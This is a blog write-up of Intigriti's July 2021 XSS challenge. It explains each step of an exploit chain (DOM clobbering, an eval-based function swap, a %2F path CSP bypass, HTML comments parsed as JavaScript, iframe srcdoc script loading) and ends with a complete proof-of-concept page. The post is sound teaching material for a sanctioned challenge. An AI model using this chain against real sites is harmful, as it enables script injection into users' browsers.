---
title: "Intigriti July XSS Challenge: Breaking Through Multiple Levels"
catalog: true
date: 2021-08-06 20:43:13
tags: [Security, Front-end]
categories: [Security]
photos: /img/intigriti-xss-0721/cover-en.png
---

## Introduction

[Intigriti](https://www.intigriti.com/) holds an XSS challenge every month, giving you a week to solve an XSS problem with the goal of successfully executing `alert(document.domain)`.

As a front-end security engineer, I participate every month (but not necessarily solve it). Below are my notes from the previous months:

1. [Experience of Solving Intigriti's 0421 XSS Challenge (Part 1)](https://blog.huli.tw/2021/05/25/xss-challenge-by-intigriti-writeup/)
2. [Intigriti's 0521 XSS Challenge Solution: Limited Character Combination Code](https://blog.huli.tw/2021/06/07/xss-challenge-by-intigriti-writeup-may/)
3. [Intigriti June XSS Challenge Review](https://blog.huli.tw/2021/07/03/xss-challenge-intigriti-june-review/)

Each month's challenge is quite interesting, and I think the difficulty is well controlled. It's not super difficult, but it's not easy to solve right away either. I also found this month's challenge very fun, so after solving it, I wrote this article to share my experience with everyone, hoping that more and more people can participate.

Challenge URL: https://challenge-0721.intigriti.io/

<!-- more -->

## Analyzing the Problem

If you look closely, you'll find that this challenge is a bit more complicated because there are three pages and a bunch of `postMessage` and `onmessage` events, which takes some time to figure out their relationship.

After looking at it, I decided to start from the opposite direction because it's an XSS problem, which means there must be a place to execute code, usually `eval` or `innerHTML`, so I can find it first and then figure out how to get there.

Next, let's take a brief look at the three pages:

1. index.html
2. htmledit.php
3. console.php

### index.html

``` html
<div class="card-container">
 <div class="card-header-small">Your payloads:</div>
 <div class="card-content">
    <script>
       // redirect all htmledit messages to the console
       onmessage = e =>{
          if (e.data.fromIframe){
             frames[0].postMessage({cmd:"log",message:e.data.fromIframe}, '*');
          }
       }
       /*
       var DEV = true;
       var store = {
           users: {
             admin: {
                username: 'inti',
                password: 'griti'
             }, moderator: {
                username: 'root',
                password: 'toor'
             }, manager: {
                username: 'andrew',
                password: 'hunter2'
             },
          }
       }
       */
    </script>

    <div class="editor">
       <span id="bin">
          <a onclick="frames[0].postMessage({cmd:'clear'},'*')">🗑️</a>
       </span>
       <iframe class=console src="./console.php"></iframe>
       <iframe class=codeFrame src="./htmledit.php?code=<img src=x>"></iframe>
       <textarea oninput="this.previousElementSibling.src='./htmledit.php?code='+escape(this.value)"><img src=x></textarea>
    </div>
 </div>
</div>
```

Other than the commented-out variable, there doesn't seem to be anything special.

### htmledit.php

``` html
<!-- &lt;img src=x&gt; -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Native HTML editor</title>
    <script nonce="d8f00e6635e69bafbf1210ff32f96bdb">
        window.addEventListener('error', function(e){
            let obj = {type:'err'};
            if (e.message){
                obj.text = e.message;
            } else {
                obj.text = `Exception called on ${e.target.outerHTML}`;
            }
            top.postMessage({fromIframe:obj}, '*');
        }, true);
        onmessage=(e)=>{
            top.postMessage({fromIframe:e.data}, '*')
        }
    </script>
</head>
<body>
    <img src=x></body>
</html>
<!-- /* Page loaded in 0.000024 seconds */ -->
```

This page directly displays the contents of the query string code on the page, and there is a mysterious comment at the beginning that encodes the content after code encoding. But even though it's displayed on the page, it can't be executed because of strict CSP: `script-src 'nonce-...';frame-src https:;object-src 'none';base-uri 'none';`

However, the frame-src is specially opened in the CSP, and when I saw this, I thought, "This might be a hint that we need to use an iframe."

### console.php

``` html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <script nonce="c4936ad76292ee7100ecb9d72054e71f">
        name = 'Console'
        document.title = name;
        if (top === window){
            document.head.parentNode.remove(); // hide code if not on iframe
        }
    </script>
    <style>
        body, ul {
            margin:0;
            padding:0;
        }

        ul#console {
            background: lightyellow;
            list-style-type: none;
            font-family: 'Roboto Mono', monospace;
            font-size: 14px;
            line-height: 25px;
        }

        ul#console li {
            border-bottom: solid 1px #80808038;
            padding-left: 5px;

        }
    </style>
</head>
<body>
    <ul id="console"></ul>
    <script nonce="c4936ad76292ee7100ecb9d72054e71f">
        let a = (s) => s.anchor(s);
        let s = (s) => s.normalize('NFC');
        let u = (s) => unescape(s);
        let t = (s) => s.toString(0x16);
        let parse = (e) => (typeof e === 'string') ? s(e) : JSON.stringify(e, null, 4); // make object look like string
        let log = (prefix, data, type='info', safe=false) => {
            let line = document.createElement("li");
            let prefix_tag = document.createElement("span");
            let text_tag = document.createElement("span");
            switch (type){
                case 'info':{
                    line.style.backgroundColor = 'lightcyan';
                    break;
                }
                case 'success':{
                    line.style.backgroundColor = 'lightgreen';
                    break;
                }
                case 'warn':{
                    line.style.backgroundColor = 'lightyellow';
                    break;
                }
                case 'err':{
                    line.style.backgroundColor = 'lightpink';
                    break;
                } 
                default:{
                    line.style.backgroundColor = 'lightcyan';
                }
            }
            
            data = parse(data);
            if (!safe){
                data = data.replace(/</g, '&lt;');
            }

            prefix_tag.innerHTML = prefix;
            text_tag.innerHTML = data;

            line.appendChild(prefix_tag);
            line.appendChild(text_tag);
            document.querySelector('#console').appendChild(line);
        } 

        log('Connection status: ', window.navigator.onLine?"Online":"Offline")
        onmessage = e => {
            switch (e.data.cmd) {
                case "log": {
                    log("[log]: ", e.data.message.text, type=e.data.message.type);
                    break;
                }
                case "anchor": {
                    log("[anchor]: ", s(a(u(e.data.message))), type='info')
                    break;
                }
                case "clear": {
                    document.querySelector('#console').innerHTML = "";
                    break;
                }
                default: {
                    log("[???]: ", `Wrong command received: "${e.data.cmd}"`)
                }
            }
        }
    </script>
    <script nonce="c4936ad76292ee7100ecb9d72054e71f">
        try {
            if (!top.DEV)
                throw new Error('Production build!');
                
            let checkCredentials = (username, password) => {
                try{
                    let users = top.store.users;
                    let access = [users.admin, users.moderator, users.manager];
                    if (!users || !password) return false;
                    for (x of access) {
                        if (x.username === username && x.password === password)
                            return true
                    }
                } catch {
                    return false
                }
                return false
            }

            let _onmessage = onmessage;
            onmessage = e => {
                let m = e.data;
                if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) {
                    return; // do nothing if unauthorized
                }
            
                switch(m.cmd){
                    case "ping": { // check the connection
                        e.source.postMessage({message:'pong'},'*');
                        break;
                    }
                    case "logv": { // display variable's value by its name
                        log("[logv]: ", window[m.message], safe=false, type='info'); 
                        break;
                    }
                    case "compare": { // compare variable's value to a given one
                        log("[compare]: ", (window[m.message.variable] === m.message.value), safe=true, type='info'); 
                        break;
                    }
                    case "reassign": { // change variable's value
                        let o = m.message;
                        try {
                            let RegExp = /^[s-zA-Z-+0-9]+$/;
                            if (!RegExp.test(o.a) || !RegExp.test(o.b)) {
                                throw new Error('Invalid input given!');
                            }
                            eval(`${o.a}=${o.b}`);
                            log("[reassign]: ", `Value of "${o.a}" was changed to "${o.b}"`, type='warn');
                        } catch (err) {
                            log("[reassign]: ", `Error changing value (${err.message})`, type='err');
                        }
                        break;
                    }
                    default: {
                        _onmessage(e); // keep default functions
                    }
                }
            }
        } catch {
            // hide this script on production
            document.currentScript.remove();
        }
    </script>
    <script src="./analytics/main.js?t=1627610836"></script>
</body>
</html>
```

This page has a lot more code than the other two pages, and we can find some things we need, such as `eval`:

``` js
let _onmessage = onmessage;
onmessage = e => {
    let m = e.data;
    if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) {
        return; // do nothing if unauthorized
    }

    switch(m.cmd){
        // ...
        case "reassign": { // change variable's value
            let o = m.message;
            try {
                let RegExp = /^[s-zA-Z-+0-9]+$/;
                if (!RegExp.test(o.a) || !RegExp.test(o.b)) {
                    throw new Error('Invalid input given!');
                }
                eval(`${o.a}=${o.b}`);
                log("[reassign]: ", `Value of "${o.a}" was changed to "${o.b}"`, type='warn');
            } catch (err) {
                log("[reassign]: ", `Error changing value (${err.message})`, type='err');
            }
            break;
        }
        default: {
            _onmessage(e); // keep default functions
        }
    }
}
```

But this `eval` seems unable to execute the code we want directly because the rules are quite strict (uppercase letters, some lowercase letters, numbers, and + -), so it may have other uses.

Another possible place is here:

``` js
let log = (prefix, data, type='info', safe=false) => {
    let line = document.createElement("li");
    let prefix_tag = document.createElement("span");
    let text_tag = document.createElement("span");
    switch (type){
        // not important
    }
    
    data = parse(data);
    if (!safe){
        data = data.replace(/</g, '&lt;');
    }

    prefix_tag.innerHTML = prefix;
    text_tag.innerHTML = data;

    line.appendChild(prefix_tag);
    line.appendChild(text_tag);
    document.querySelector('#console').appendChild(line);
} 
```

If safe is true, data will not be escaped, and any HTML can be inserted to achieve XSS.

It's worth noting the function's parameter section: `let log = (prefix, data, type='info', safe=false)`, which deserves special explanation.

In some programming languages, named parameters are supported, and when calling a function, parameters can be passed by name, such as `log(prefix='a', safe=true)`, which passes the corresponding parameters.

However, there is no such thing in JS, and the correspondence of parameters is entirely determined by "order." For example, `log("[logv]: ", window[m.message], safe=false, type='info');` corresponds to the following parameters:

1. prefix: `"[logv]: "`
2. data: `window[m.message]`
3. type: `false`
4. safe: `'info'`

It is based on the order rather than the name, which is also a common confusion for many beginners.

Anyway, let's start from the `log` function and work our way back. To execute this section, we need to post a message to this window and meet some conditions.

## Level 1: Successfully post a message

There are some conditions on this console.php page. If these conditions are not met, we cannot execute the log function.

First, this page must be embedded in an iframe:

``` js
name = 'Console'
document.title = name;
if (top === window){
    document.head.parentNode.remove(); // hide code if not on iframe
}
```

Then there are these checks to pass:

``` js
try {
    if (!top.DEV)
        throw new Error('Production build!');
        
    let checkCredentials = (username, password) => {
        try{
            let users = top.store.users;
            let access = [users.admin, users.moderator, users.manager];
            if (!users || !password) return false;
            for (x of access) {
                if (x.username === username && x.password === password)
                    return true
            }
        } catch {
            return false
        }
        return false
    }

    let _onmessage = onmessage;
    onmessage = e => {
        let m = e.data;
        if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) {
            return; // do nothing if unauthorized
        }
        // ...
    }
} catch {
    // hide this script on production
    document.currentScript.remove();
}
```

`top.DEV` must be truthy, and the credentials passed in must match `top.store.users.admin.username` and `top.store.users.admin.password`.

So should I write my own page and set these global variables?

Unfortunately, due to the existence of Same Origin Policy, you can only access the contents of windows under the same origin page. Therefore, if you embed console.php in a page you wrote yourself, an error will occur when accessing `top.DEV`.

So we need a same-origin page that allows us to set some things. And this page is obviously htmledit.php, which allows us to insert some HTML.

## DOM clobbering

How do we set global variables without executing JS? Yes, it's DOM clobbering.

For example, if you have a `<div id="a"></div>`, in JS you can use `window.a` or `a` to access the DOM of this div.

If you are not familiar with DOM clobbering, you can refer to my previous article [A Brief Discussion on the Principle and Application of DOM Clobbering](https://blog.huli.tw/2021/01/23/dom-clobbering/), or this one is also well written: [Expanding XSS with Dom Clobbering](https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/)

If you want to achieve multi-level variable setting, you need to use `iframe` with `srcdoc`:

``` html
<a id="DEV"></a>
<iframe name="store" srcdoc='
    <a id="users"></a>
    <a id="users" name="admin" href="ftp://a:a@a"></a>
    '>
</iframe>
<iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
```

Here we also use a feature that the username attribute of the a element will be the username in the href attribute URL.

In this way, `top.DEV` will be the DOM of `a id="DEV"></a>`, and `store.users` will be an HTMLCollection. `store.users.admin` is that a, and `store.users.admin.username` will be the username in href, which is `a`, and the password is the same.

In summary, I can write my own HTML and use `window.open` to open htmledit.php and bring the above content into it:

``` html
<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <title>XSS POC</title>  
</head>
<body>
  <script>
    const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code='
    const payload = `
      <a id="DEV"></a>
      <iframe name="store" srcdoc='
        <a id="users"></a>
        <a id="users" name="admin" href="ftp://a:a@a"></a>
      '></iframe>
      <iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
    `

    var win = window.open(htmlUrl + encodeURIComponent(payload))

    // wait unitl window loaded
    setTimeout(() => {
      console.log('go')
      const credentials = {
        username: 'a',
        password: 'a'
      }
      win.frames[1].postMessage({
        cmd: 'test',
        credentials
      }, '*')
    }, 5000)

  </script>
</body>
</html>
```

In this way, I can use postMessage to send messages in.

Although it took some effort, this is just the beginning.

## Level 2: Make safe true

To make safe true, so that `<` will not be escaped when calling log, we need to find a call that passes in four parameters, because the fourth one will be the value of safe:

``` js
case "logv": { // display variable's value by its name
    log("[logv]: ", window[m.message], safe=false, type='info'); 
    break;
}
case "compare": { // compare variable's value to a given one
    log("[compare]: ", (window[m.message.variable] === m.message.value), safe=true, type='info'); 
    break;
}
```

`log("[logv]: ", window[m.message], safe=false, type='info')` is the function call I'm looking for, and the second parameter in it will be `window[m.message]`, which means that any global variable can be passed in as data. But what should be passed in?

## Level 3: Find the variables that can be passed in

I've been stuck here for a long time because I can't think of what can be passed in here. There used to be a trick to pass in name, but this webpage has already set its own name so it cannot be used. Another trick is to use URL to pass in and put things on location, but `log` will check whether `data` is a string. If it is not, it needs to be passed through `JSON.stringify`, which will encode the content.

I had to keep repeating and looking at the code to see if I could find something new, and I really did. The following code has a common problem for beginners. Can you see it?

``` js
let checkCredentials = (username, password) => {
    try{
        let users = top.store.users;
        let access = [users.admin, users.moderator, users.manager];
        if (!users || !password) return false;
        for (x of access) {
            if (x.username === username && x.password === password)
                return true
        }
    } catch {
        return false
    }
    return false
}
```

The problem lies in `for (x of access) {`, where `x` was not declared, so it defaults to a global variable. Here, `x` will be `top.store.users.admin`, which is the `<a>` we set ourselves.

## Level 4: Bypassing Type Check

Now that we have `x`, we can pass it into the `log` function using the `logv` command. Since `safe` is true, we can directly display the contents of `x` using `innerHTML`.

If you convert an `a` element to a string, you will get the contents of `a.href`, so we can put our payload in `href`.

However, `log` checks the type of `data`, and `a` is not a string, so it fails the check. What should we do?

At this point, I looked back at the code and found this command:

``` js
case "reassign": { // change variable's value
    let o = m.message;
    try {
        let RegExp = /^[s-zA-Z-+0-9]+$/;
        if (!RegExp.test(o.a) || !RegExp.test(o.b)) {
            throw new Error('Invalid input given!');
        }
        eval(`${o.a}=${o.b}`);
        log("[reassign]: ", `Value of "${o.a}" was changed to "${o.b}"`, type='warn');
    } catch (err) {
        log("[reassign]: ", `Error changing value (${err.message})`, type='err');
    }
    break;
}
```

I can do this:

``` js
win.frames[1].postMessage({
    cmd: 'reassign',
    message:{
      a: 'Z',
      b: 'x+1'
    },
    credentials
}, '*')
```

This is equivalent to `Z=x+1`, and when `x+1` is automatically converted to a string, `Z` will be a string containing our payload.

## Level 5: Bypassing Encode

Although we can now pass in a string, there is still one thing to do. The contents of `href` are URL-encoded, so `<` becomes `%3C`:

``` js
var a = document.createElement('a')
a.setAttribute('href', 'ftp://a:a@a#<img src=x onload=alert(1)>')
console.log(a+1)
// ftp://a:a@a/#%3Cimg%20src=x%20onload=alert(1)%3E1
```

What should we do now?

In `log`, there is a line that says `data = parse(data)`, and the code for `parse` is like this:

``` js
let parse = (e) => (typeof e === 'string') ? s(e) : JSON.stringify(e, null, 4); // make object look like string
```

If `e` is a string, it returns `s(e)`, and `s` is another function.

When I was looking at the code, I noticed the rules for `eval` checking at the reassign part: `RegExp = /^[s-zA-Z-+0-9]+$/;`, and these four functions:

``` js
let a = (s) => s.anchor(s);
let s = (s) => s.normalize('NFC');
let u = (s) => unescape(s);
let t = (s) => s.toString(0x16);
```

Among them, `s`, `u`, and `t` are allowed, which means that they can be swapped using the `reassign` command! We can replace `s` with `u`, so that `data` will be unescaped!

So the final code will look like this:

``` js
const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code='
const insertPayload=`<img src=x onerror=alert(1)>`
const payload = `
  <a id="DEV"></a>
  <iframe name="store" srcdoc='
    <a id="users"></a>
    <a id="users" name="admin" href="ftp://a:a@a#${escape(insertPayload)}"></a>
  '></iframe>
  <iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
`

var win = window.open(htmlUrl + encodeURIComponent(payload))

// 等待 window 載入完成
setTimeout(() => {
  console.log('go')
  const credentials = {
    username: 'a',
    password: 'a'
  }
  // s=u
  win.frames[1].postMessage({
    cmd: 'reassign',
    message:{
      a: 's',
      b: 'u'
    },
    credentials
  }, '*')

  // Z=x+1 so Z = x.href + 1
  win.frames[1].postMessage({
    cmd: 'reassign',
    message:{
      a: 'Z',
      b: 'x+1'
    },
    credentials
  }, '*')

  // log window[Z]
  win.frames[1].postMessage({
    cmd: 'logv',
    message: 'Z',
    credentials
  }, '*')
}, 5000)
```

So `data` will be `ftp://a:a@a#<img src=x onerror=alert(1)>`, and it will be set to HTML, triggering XSS!

No, things are not that easy... I forgot about CSP.

## Level 6: Bypassing CSP

Although I can insert any HTML, unfortunately, this webpage also has CSP:

```
script-src 
'nonce-xxx' 
https://challenge-0721.intigriti.io/analytics/ 
'unsafe-eval';

frame-src https:;

object-src 'none';base-uri 'none';
```

Since there is no `unsafe-inline`, our previous payload is invalid. In this CSP, `https://challenge-0721.intigriti.io/analytics/` is obviously a suspicious path.

This page actually imports a file called `https://challenge-0721.intigriti.io/analytics/main.js`, but it has nothing in it, just some comments.

When I saw this, I knew how to do it, because I had learned a technique to bypass CSP before, using `%2F` (encoded `/`) and the inconsistency between URL parsing on the front and back ends.

Taking `https://challenge-0721.intigriti.io/analytics/..%2fhtmledit.php` as an example, for the browser, this URL is under `/analytics`, so it can pass the CSP check.

But for the server, this segment is actually `https://challenge-0721.intigriti.io/analytics/../htmledit.php`, which is `https://challenge-0721.intigriti.io/htmledit.php`.

So we successfully bypassed CSP and loaded files from different paths!

Therefore, the goal now is to find a file where we can put JS code. Looking around, only `htmledit.php` seems to work, but isn't it an HTML?

## Level 7: Constructing JS Code

If you still remember, there is an HTML comment at the beginning of this page:

``` html
<!-- &lt;img src=x&gt; -->
....
```

In some cases, this syntax is actually a comment in JS. It's not me saying it, it's in the specification:

![ECMAScript spec](/img/others/xss-july.jpg)

In other words, we can take advantage of this and create a file that looks like HTML but is actually valid JS!

The URL I finally came up with is: `https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*`

The generated HTML looks like this:

``` html
<!-- 1; 這邊都是註解
top.alert(document.domain);/* --> 這之後也都是註解了
<!DOCTYPE html>
<html lang="en">
<head>
...
```

The first line is a comment, and everything after `/*` is also a comment, so this entire section is actually just `top.alert(document.domain);`.

However, it's worth noting that the content type of htmledit.php doesn't change and is still `text/html`. The reason we can import it as JS is because of the same origin relationship. If you import an HTML file from a different origin as JS, it will be blocked by [CORB](https://www.chromium.org/Home/chromium-security/corb-for-developers).

At this point, we can make `data` equal to `<script src="https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*"></script>`, and it will execute when `text_tag.innerHTML = data` is called, bypassing CSP and successfully inserting the script into the page!

But unfortunately, we're not quite there yet...

## Level 8: Executing dynamically inserted scripts

Just when I thought I was about to pass the level, I found that my script wouldn't execute no matter what I did. I looked up some [keywords](https://stackoverflow.com/questions/1197575/can-scripts-be-inserted-with-innerhtml) and found out that if you insert a script tag using innerHTML, it won't execute.

I tried searching for solutions using keywords like `innerhtml import script` or `innerhtml script run`, but I couldn't find anything.

Finally, I thought of trying `<iframe srcdoc="...">`. It was a bit of a long shot, but I figured I might as well try it since I had nothing to lose.

As it turns out, it worked. If the content is `<iframe srcdoc="<script src='...'></script>"`, it will load the script directly.

## Final solution

One last thing to note is that before submitting my answer, I found that my answer wouldn't work on Firefox. The reason is this piece of code:

``` html
<a id="users"></a>
<a id="users" name="admin" href="a"></a>
```

In Chrome, `window.users` will be an HTMLCollection, but in Firefox, it will only get one a element, and `window.users.admin` will be undefined.

However, this isn't a big problem. You can solve it by adding another layer of iframe:

``` html
<iframe name="store" srcdoc="
  <iframe srcdoc='<a id=admin href=ftp://a:a@a#></a>' name=users>
">
</iframe>
```

My final answer looks like this:

``` html
<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <title>XSS POC</title>  
</head>

<body>
  <script>
    const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code='
    const exploitSrc = '/analytics/..%2fhtmledit.php?code=1;%0atop.alert(document.domain);/*'
    const insertPayload=`<iframe srcdoc="<script src=${exploitSrc}><\/script>">`
    const payload = `
      <a id="DEV"></a>
      <iframe name="store" srcdoc="
        <iframe srcdoc='<a id=admin href=ftp://a:a@a#${escape(insertPayload)}></a>' name=users>
      ">
      </iframe>
      <iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
    `
    var win = window.open(htmlUrl + encodeURIComponent(payload))

    // wait for 3s to let window loaded
    setTimeout(() => {
      const credentials = {
        username: 'a',
        password: 'a'
      }
      win.frames[1].postMessage({
        cmd: 'reassign',
        message:{
          a: 's',
          b: 'u'
        },
        credentials
      }, '*')

      win.frames[1].postMessage({
        cmd: 'reassign',
        message:{
          a: 'Z',
          b: 'x+1'
        },
        credentials
      }, '*')

      win.frames[1].postMessage({
        cmd: 'logv',
        message: 'Z',
        credentials
      }, '*')
    }, 3000)

  </script>
</body>
</html>

```

## Other solutions

My method was to open a new window to post a message, but you can also embed yourself as an iframe and let htmledit.php embed it. In this case, you can also use top.postMessage to send messages.

Embedding yourself in another webpage is something I often forget.

Another unexpected solution is based on this piece of code:

``` js
case "log": {
  log("[log]: ", e.data.message.text, type=e.data.message.type);
  break;
}
```

The key point here is `type=e.data.message.type`, which sets a global variable called `type`. Therefore, you can pass in any payload through this and then call `logv`. This eliminates the need to handle the payload in the `a` tag.

## Summary

I really like this challenge because it feels like a series of levels that you have to pass one by one. Every time I thought I was about to pass a level, I would get stuck again, until I finally solved all the levels and successfully executed XSS.

From this challenge, you can learn the following frontend knowledge:

1. DOM clobbering
2. JS comments are not just `//` and `/* */`
3. Bypassing CSP for paths
4. Scripts added with innerHTML won't execute
5. You can use iframe srcdoc to bypass this (but in general, you should add a script tag and append it)

From this topic, you can learn or review many skills. The interesting point of CTF and this type of challenge is here. Although you may know everything separately, it is very challenging to carefully string them together, which tests experience and skills.

If you are interested in XSS challenges, you can follow [Intigriti](https://twitter.com/intigriti) and wait for the next challenge.
